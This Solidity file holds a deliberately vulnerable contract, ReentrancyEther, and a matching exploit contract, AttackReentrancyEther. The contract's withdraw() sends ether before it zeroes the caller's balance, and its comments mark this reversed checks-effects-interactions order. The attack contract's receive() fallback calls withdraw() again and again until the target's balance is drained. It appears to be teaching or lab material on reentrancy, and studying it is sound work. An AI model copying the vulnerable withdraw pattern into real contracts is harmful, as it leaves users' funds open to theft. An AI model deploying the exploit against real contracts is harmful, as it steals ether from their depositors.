// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ReentrancyEther {
    error ReentrancyEther_InsufficientBalance();
    error ReentrancyEther_SendingEtherError();
    error ReentrancyEther_NonReentrant();

    mapping(address user => uint amount) private s_balances;

    event Deposited(address, uint);
    event Withdrawed(address, uint);

    function deposit() public payable {
        s_balances[msg.sender] += msg.value;

        emit Deposited(msg.sender, msg.value);
    }

    function withdraw() public payable {
        uint balance = s_balances[msg.sender];

        // Checks
        if (balance <= 0) {
            revert ReentrancyEther_InsufficientBalance();
        }

        // Interactions
        (bool sent, ) = address(msg.sender).call{value: balance}("");

        if (!sent) {
            revert ReentrancyEther_SendingEtherError();
        }

        // Effects
        s_balances[msg.sender] = 0;

        emit Withdrawed(msg.sender, balance);
    }

    function getBalanceOf(address _of) external view returns (uint) {
        return s_balances[_of];
    }
}

contract AttackReentrancyEther {
    ReentrancyEther immutable i_target;

    constructor(address target) {
        i_target = ReentrancyEther(target);
    }

    receive() external payable {
        if (address(i_target).balance > 0) {
            i_target.withdraw();
        }
    }

    function deposit() public payable {}

    function attack(uint amount) public {
        i_target.deposit{value: amount}();
        i_target.withdraw();
    }
}
